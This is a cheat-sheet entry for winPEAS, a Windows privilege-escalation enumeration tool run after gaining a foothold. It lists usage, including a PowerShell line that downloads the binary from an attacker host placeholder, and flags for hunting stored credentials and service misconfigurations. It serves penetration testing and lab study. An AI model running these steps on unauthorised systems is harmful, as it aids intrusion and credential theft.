---
slug: winpeas
name: winPEAS
category: Privesc
tags: [privesc, enumeration, windows, post-exploitation, peass]
oneLiner: Windows Privilege Escalation Awesome Script. Run it on a foothold to auto-enumerate the host and flag likely escalation paths, colour-coded by interest.
---

## Common usage

Transfer it (on target), then run
```sh
.\winPEASx64.exe
```

Download via PowerShell first
```sh
powershell -c "iwr http://<LHOST>/winPEASx64.exe -o winPEAS.exe"
```

Save output to a file
```sh
.\winPEASx64.exe log=out.txt
```

## Key parameters

| Flag | What it does |
| --- | --- |
| `(no args)` | Run all checks with default settings |
| `log=<file>` | Tee all output to a file |
| `quiet` | Drop the banner and ASCII art |
| `systeminfo` | Run only the system-information checks |
| `userinfo` | Run only the user and group checks |

## More flags

| Flag | What it does |
| --- | --- |
| `servicesinfo` | Service misconfig checks (unquoted paths, weak perms) |
| `applicationsinfo` | Installed apps and their permissions |
| `windowscreds` | Hunt for stored credentials |
| `filesinfo` | Interesting files and sensitive paths |
| `cmd` | Run checks that shell out to system binaries |
| `notcolor` | Disable ANSI colour (for redirected output) |

## Gotchas & tips

- Pick the right build: winPEASx64.exe for 64-bit, winPEASany.exe (.NET) when unsure; there's a .bat for locked-down hosts.
- Red/yellow highlights mark the highest-value findings — start there: misconfigured services, stored creds, token privileges.
- Colour codes break in dumb shells; run with notcolor or log= and review the file instead.
- It's noisy and touches disk — fine for labs; in real engagements prefer targeted manual checks.
